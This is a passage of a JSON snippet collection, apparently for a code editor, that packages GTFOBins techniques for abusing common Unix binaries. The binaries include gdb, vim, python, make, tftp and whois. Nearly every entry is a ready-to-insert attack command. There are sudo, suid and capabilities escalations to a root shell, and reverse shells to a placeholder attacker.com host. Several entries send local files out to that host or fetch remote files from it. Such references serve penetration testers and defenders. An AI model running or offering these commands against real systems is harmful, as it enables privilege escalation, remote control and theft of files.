            "LFILE=${1:file_to_write}",
            "find / -fprintf \"\\$FILE\" DATA -quit${0}",
            "```"
        ],
        "description": "abuse find with file-write - DATA is a format string, it supports some escape sequences."
    },
    "gdb shell (gtfobins)": {
        "prefix": "gdb shell",
        "body": [
            "abuse gdb with shell",
            "",
            "```sh",
            "gdb -nx -ex '!sh' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with shell"
    },
    "gdb reverse-shell (gtfobins)": {
        "prefix": "gdb reverse-shell",
        "body": [
            "abuse gdb with reverse-shell, This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with reverse-shell - This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "gdb file-upload (gtfobins)": {
        "prefix": "gdb file-upload",
        "body": [
            "abuse gdb with file-upload, This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "gdb -nx -ex 'python import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-upload - This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server."
    },
    "gdb file-download (gtfobins)": {
        "prefix": "gdb file-download",
        "body": [
            "abuse gdb with file-download, This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "gdb -nx -ex 'python import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-download - This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request."
    },
    "gdb file-write (gtfobins)": {
        "prefix": "gdb file-write",
        "body": [
            "abuse gdb with file-write, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "gdb -nx -ex \"dump value \\$LFILE \\\"DATA\\\"\" -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-write - This requires that GDB is compiled with Python support."
    },
    "gdb file-read (gtfobins)": {
        "prefix": "gdb file-read",
        "body": [
            "abuse gdb with file-read, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "gdb -nx -ex 'python print(open(\"${1:file_to_read}\").read())' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with file-read - This requires that GDB is compiled with Python support."
    },
    "gdb library-load (gtfobins)": {
        "prefix": "gdb library-load",
        "body": [
            "abuse gdb with library-load, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with library-load - This requires that GDB is compiled with Python support."
    },
    "gdb suid (gtfobins)": {
        "prefix": "gdb suid",
        "body": [
            "abuse gdb with suid, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with suid - This requires that GDB is compiled with Python support."
    },
    "gdb sudo (gtfobins)": {
        "prefix": "gdb sudo",
        "body": [
            "abuse gdb with sudo",
            "",
            "```sh",
            "sudo gdb -nx -ex '!sh' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with sudo"
    },
    "gdb capabilities (gtfobins)": {
        "prefix": "gdb capabilities",
        "body": [
            "abuse gdb with capabilities, This requires that GDB is compiled with Python support.",
            "",
            "```sh",
            "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with capabilities - This requires that GDB is compiled with Python support."
    },
    "openvt sudo (gtfobins)": {
        "prefix": "openvt sudo",
        "body": [
            "abuse openvt with sudo, The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file.",
            "",
            "```sh",
            "COMMAND=id",
            "TF=\\$(mktemp -u)",
            "sudo openvt -- sh -c \"\\$COMMAND >\\$TF 2>&1\"",
            "cat \\$TF${0}",
            "```"
        ],
        "description": "abuse openvt with sudo - The command execution is blind (displayed on the virtual console), but it is possible to save the output on a temporary file."
    },
    "make shell (gtfobins)": {
        "prefix": "make shell",
        "body": [
            "abuse make with shell",
            "",
            "```sh",
            "COMMAND='/bin/sh'",
            "make -s --eval=\\$'x:\\n\\t-'\"\\$COMMAND\"${0}",
            "```"
        ],
        "description": "abuse make with shell"
    },
    "make file-write (gtfobins)": {
        "prefix": "make file-write",
        "body": [
            "abuse make with file-write, Requires a newer GNU `make` version.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "make -s --eval=\"\\\\$(file >\\$LFILE,DATA)\" .${0}",
            "```"
        ],
        "description": "abuse make with file-write - Requires a newer GNU `make` version."
    },
    "make suid (gtfobins)": {
        "prefix": "make suid",
        "body": [
            "abuse make with suid",
            "",
            "```sh",
            "COMMAND='/bin/sh -p'",
            "./make -s --eval=\\$'x:\\n\\t-'\"\\$COMMAND\"${0}",
            "```"
        ],
        "description": "abuse make with suid"
    },
    "make sudo (gtfobins)": {
        "prefix": "make sudo",
        "body": [
            "abuse make with sudo",
            "",
            "```sh",
            "COMMAND='/bin/sh'",
            "sudo make -s --eval=\\$'x:\\n\\t-'\"\\$COMMAND\"${0}",
            "```"
        ],
        "description": "abuse make with sudo"
    },
    "diff file-read (gtfobins)": {
        "prefix": "diff file-read",
        "body": [
            "abuse diff with file-read, This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.",
            "",
            "```sh",
            "LFOLDER=folder_to_list",
            "TF=\\$(mktemp -d)",
            "diff --recursive \\$TF \\$LFOLDER${0}",
            "```"
        ],
        "description": "abuse diff with file-read - This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output."
    },
    "diff suid (gtfobins)": {
        "prefix": "diff suid",
        "body": [
            "abuse diff with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./diff --line-format=%L /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse diff with suid"
    },
    "diff sudo (gtfobins)": {
        "prefix": "diff sudo",
        "body": [
            "abuse diff with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo diff --line-format=%L /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse diff with sudo"
    },
    "pkg sudo (gtfobins)": {
        "prefix": "pkg sudo",
        "body": [
            "abuse pkg with sudo, \nIt runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo pkg install -y --no-repo-update ./x-1.0.txz${0}",
            "```"
        ],
        "description": "abuse pkg with sudo - \nIt runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "minicom shell (gtfobins)": {
        "prefix": "minicom shell",
        "body": [
            "abuse minicom with shell, \nAfter the shell, exit with `Ctrl-A x`.\n",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo \"! exec /bin/sh <\\$(tty) 1>\\$(tty) 2>\\$(tty)\" >\\$TF",
            "minicom -D /dev/null -S \\$TF",
            "reset^J${0}",
            "```"
        ],
        "description": "abuse minicom with shell - \nAfter the shell, exit with `Ctrl-A x`.\n"
    },
    "minicom sudo (gtfobins)": {
        "prefix": "minicom sudo",
        "body": [
            "abuse minicom with sudo, \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n",
            "",
            "```sh",
            "sudo minicom -D /dev/null${0}",
            "```"
        ],
        "description": "abuse minicom with sudo - \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n"
    },
    "minicom suid (gtfobins)": {
        "prefix": "minicom suid",
        "body": [
            "abuse minicom with suid, \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n",
            "",
            "```sh",
            "./minicom -D /dev/null${0}",
            "```"
        ],
        "description": "abuse minicom with suid - \nStart the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n\n3. Press `Esc` twice;\n\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.\n"
    },
    "ksshell file-read (gtfobins)": {
        "prefix": "ksshell file-read",
        "body": [
            "abuse ksshell with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ksshell -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ksshell with file-read"
    },
    "ksshell suid (gtfobins)": {
        "prefix": "ksshell suid",
        "body": [
            "abuse ksshell with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ksshell -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ksshell with suid"
    },
    "ksshell sudo (gtfobins)": {
        "prefix": "ksshell sudo",
        "body": [
            "abuse ksshell with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ksshell -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ksshell with sudo"
    },
    "ar file-read (gtfobins)": {
        "prefix": "ar file-read",
        "body": [
            "abuse ar with file-read",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "LFILE=${1:file_to_read}",
            "ar r \"\\$TF\" \"\\$LFILE\"",
            "cat \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse ar with file-read"
    },
    "ar suid (gtfobins)": {
        "prefix": "ar suid",
        "body": [
            "abuse ar with suid",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "LFILE=${1:file_to_read}",
            "./ar r \"\\$TF\" \"\\$LFILE\"",
            "cat \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse ar with suid"
    },
    "ar sudo (gtfobins)": {
        "prefix": "ar sudo",
        "body": [
            "abuse ar with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "LFILE=${1:file_to_read}",
            "sudo ar r \"\\$TF\" \"\\$LFILE\"",
            "cat \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse ar with sudo"
    },
    "ss file-read (gtfobins)": {
        "prefix": "ss file-read",
        "body": [
            "abuse ss with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ss -a -F \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ss with file-read"
    },
    "ss suid (gtfobins)": {
        "prefix": "ss suid",
        "body": [
            "abuse ss with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ss -a -F \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ss with suid"
    },
    "ss sudo (gtfobins)": {
        "prefix": "ss sudo",
        "body": [
            "abuse ss with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ss -a -F \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ss with sudo"
    },
    "tftp file-upload (gtfobins)": {
        "prefix": "tftp file-upload",
        "body": [
            "abuse tftp with file-upload, Send local file to a TFTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "tftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse tftp with file-upload - Send local file to a TFTP server."
    },
    "tftp file-download (gtfobins)": {
        "prefix": "tftp file-download",
        "body": [
            "abuse tftp with file-download, Fetch a remote file from a TFTP server.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "tftp \\$RHOST",
            "get file_to_get${0}",
            "```"
        ],
        "description": "abuse tftp with file-download - Fetch a remote file from a TFTP server."
    },
    "tftp suid (gtfobins)": {
        "prefix": "tftp suid",
        "body": [
            "abuse tftp with suid, Send local file to a TFTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "./tftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse tftp with suid - Send local file to a TFTP server."
    },
    "tftp sudo (gtfobins)": {
        "prefix": "tftp sudo",
        "body": [
            "abuse tftp with sudo, Send local file to a TFTP server.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "sudo tftp \\$RHOST",
            "put ${1:file_to_send}${0}",
            "```"
        ],
        "description": "abuse tftp with sudo - Send local file to a TFTP server."
    },
    "whois file-upload (gtfobins)": {
        "prefix": "whois file-upload",
        "body": [
            "abuse whois with file-upload, Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "whois -h \\$RHOST -p \\$RPORT \"`base64 \\$LFILE`\"${0}",
            "```"
        ],
        "description": "abuse whois with file-upload - Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."
    },
    "whois file-download (gtfobins)": {
        "prefix": "whois file-download",
        "body": [
            "abuse whois with file-download, Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | nc -l -p 12345` on the attacker box to send the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_save}",
            "whois -h \\$RHOST -p \\$RPORT | base64 -d > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse whois with file-download - Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | nc -l -p 12345` on the attacker box to send the file."
    },
    "nice shell (gtfobins)": {
        "prefix": "nice shell",
        "body": [
            "abuse nice with shell",
            "",
            "```sh",
            "nice /bin/sh${0}",
            "```"
        ],
        "description": "abuse nice with shell"
    },
    "nice suid (gtfobins)": {
        "prefix": "nice suid",
        "body": [
            "abuse nice with suid",
            "",
            "```sh",
            "./nice /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse nice with suid"
    },
    "nice sudo (gtfobins)": {
        "prefix": "nice sudo",
        "body": [
            "abuse nice with sudo",
            "",
            "```sh",
            "sudo nice /bin/sh${0}",
            "```"
        ],
        "description": "abuse nice with sudo"
    },
    "vim shell (gtfobins)": {
        "prefix": "vim shell",
        "body": [
            "abuse vim with shell, This requires that `vim` is compiled with Lua support.",
            "",
            "```sh",
            "vim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with shell - This requires that `vim` is compiled with Lua support."
    },
    "vim reverse-shell (gtfobins)": {
        "prefix": "vim reverse-shell",
        "body": [
            "abuse vim with reverse-shell, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vim with reverse-shell - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "vim non-interactive-reverse-shell (gtfobins)": {
        "prefix": "vim non-interactive-reverse-shell",
        "body": [
            "abuse vim with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse vim with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim non-interactive-bind-shell (gtfobins)": {
        "prefix": "vim non-interactive-bind-shell",
        "body": [
            "abuse vim with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "vim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse vim with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim file-upload (gtfobins)": {
        "prefix": "vim file-upload",
        "body": [
            "abuse vim with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "vim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse vim with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim file-download (gtfobins)": {
        "prefix": "vim file-download",
        "body": [
            "abuse vim with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "vim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse vim with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vim file-write (gtfobins)": {
        "prefix": "vim file-write",
        "body": [
            "abuse vim with file-write",
            "",
            "```sh",
            "vim ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse vim with file-write"
    },
    "vim file-read (gtfobins)": {
        "prefix": "vim file-read",
        "body": [
            "abuse vim with file-read",
            "",
            "```sh",
            "vim ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse vim with file-read"
    },
    "vim library-load (gtfobins)": {
        "prefix": "vim library-load",
        "body": [
            "abuse vim with library-load, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vim with library-load - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vim suid (gtfobins)": {
        "prefix": "vim suid",
        "body": [
            "abuse vim with suid, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse vim with suid - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vim sudo (gtfobins)": {
        "prefix": "vim sudo",
        "body": [
            "abuse vim with sudo, This requires that `vim` is compiled with Lua support.",
            "",
            "```sh",
            "sudo vim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with sudo - This requires that `vim` is compiled with Lua support."
    },
    "vim capabilities (gtfobins)": {
        "prefix": "vim capabilities",
        "body": [
            "abuse vim with capabilities, This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with capabilities - This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vim limited-suid (gtfobins)": {
        "prefix": "vim limited-suid",
        "body": [
            "abuse vim with limited-suid, This requires that `vim` is compiled with Lua support.",
            "",
            "```sh",
            "./vim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vim with limited-suid - This requires that `vim` is compiled with Lua support."
    },
    "base58 file-read (gtfobins)": {
        "prefix": "base58 file-read",
        "body": [
            "abuse base58 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base58 \"\\$LFILE\" | base58 --decode${0}",
            "```"
        ],
        "description": "abuse base58 with file-read"
    },
    "base58 sudo (gtfobins)": {
        "prefix": "base58 sudo",
        "body": [
            "abuse base58 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo base58 \"\\$LFILE\" | base58 --decode${0}",
            "```"
        ],
        "description": "abuse base58 with sudo"
    },
    "pic file-read (gtfobins)": {
        "prefix": "pic file-read",
        "body": [
            "abuse pic with file-read, The output is prefixed with a some content as a header.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pic \\$LFILE${0}",
            "```"
        ],
        "description": "abuse pic with file-read - The output is prefixed with a some content as a header."
    },
    "pic shell (gtfobins)": {
        "prefix": "pic shell",
        "body": [
            "abuse pic with shell",
            "",
            "```sh",
            "pic -U",
            ".PS",
            "sh X sh X${0}",
            "```"
        ],
        "description": "abuse pic with shell"
    },
    "pic sudo (gtfobins)": {
        "prefix": "pic sudo",
        "body": [
            "abuse pic with sudo",
            "",
            "```sh",
            "sudo pic -U",
            ".PS",
            "sh X sh X${0}",
            "```"
        ],
        "description": "abuse pic with sudo"
    },
    "pic limited-suid (gtfobins)": {
        "prefix": "pic limited-suid",
        "body": [
            "abuse pic with limited-suid",
            "",
            "```sh",
            "./pic -U",
            ".PS",
            "sh X sh X${0}",
            "```"
        ],
        "description": "abuse pic with limited-suid"
    },
    "python shell (gtfobins)": {
        "prefix": "python shell",
        "body": [
            "abuse python with shell",
            "",
            "```sh",
            "python -c 'import os; os.system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with shell"
    },
    "python reverse-shell (gtfobins)": {
        "prefix": "python reverse-shell",
        "body": [
            "abuse python with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "python -c 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "python file-upload (gtfobins)": {
        "prefix": "python file-upload",
        "body": [
            "abuse python with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "python -c 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'${0}",
            "```"
        ],
        "description": "abuse python with file-upload - Serve files in the local folder running an HTTP server."
    },
    "python file-download (gtfobins)": {
        "prefix": "python file-download",
        "body": [
            "abuse python with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "python -c 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse python with file-download - Fetch a remote file via HTTP GET request."
    },
    "python file-write (gtfobins)": {
        "prefix": "python file-write",
        "body": [
            "abuse python with file-write",
            "",
            "```sh",
            "python -c 'open(\"${1:file_to_write}\",\"w+\").write(\"DATA\")'${0}",
            "```"
        ],
        "description": "abuse python with file-write"
    },
    "python file-read (gtfobins)": {
        "prefix": "python file-read",
        "body": [
            "abuse python with file-read",
            "",
            "```sh",
            "python -c 'print(open(\"${1:file_to_read}\").read())'${0}",
            "```"
        ],
        "description": "abuse python with file-read"
    },
    "python library-load (gtfobins)": {
        "prefix": "python library-load",
        "body": [
            "abuse python with library-load",
            "",
            "```sh",
            "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'${0}",
            "```"
        ],
        "description": "abuse python with library-load"
    },
    "python suid (gtfobins)": {
        "prefix": "python suid",
        "body": [
            "abuse python with suid",
            "",
            "```sh",
            "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${0}",
            "```"
        ],
        "description": "abuse python with suid"
    },
    "python sudo (gtfobins)": {
        "prefix": "python sudo",
        "body": [
            "abuse python with sudo",
            "",
            "```sh",
            "sudo python -c 'import os; os.system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with sudo"
    },
    "python capabilities (gtfobins)": {
        "prefix": "python capabilities",
        "body": [
            "abuse python with capabilities",
            "",
            "```sh",
            "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse python with capabilities"
    },
    "update-alternatives sudo (gtfobins)": {
        "prefix": "update-alternatives sudo",
        "body": [
            "abuse update-alternatives with sudo, Write in `$LFILE` a symlink to `$TF`.",
            "",
            "```sh",
            "LFILE=/path/to/${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "sudo update-alternatives --force --install \"\\$LFILE\" x \"\\$TF\" 0${0}",
            "```"
        ],
        "description": "abuse update-alternatives with sudo - Write in `$LFILE` a symlink to `$TF`."
    },
    "update-alternatives suid (gtfobins)": {
        "prefix": "update-alternatives suid",
        "body": [
            "abuse update-alternatives with suid, Write in `$LFILE` a symlink to `$TF`.",
            "",
            "```sh",
            "LFILE=/path/to/${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "./update-alternatives --force --install \"\\$LFILE\" x \"\\$TF\" 0${0}",
            "```"
        ],
        "description": "abuse update-alternatives with suid - Write in `$LFILE` a symlink to `$TF`."
    },
    "dnf sudo (gtfobins)": {
        "prefix": "dnf sudo",
        "body": [
            "abuse dnf with sudo, \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo dnf install -y x-1.0-1.noarch.rpm${0}",
            "```"
        ],
        "description": "abuse dnf with sudo - \nIt runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'id' > $TF/x.sh\n\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
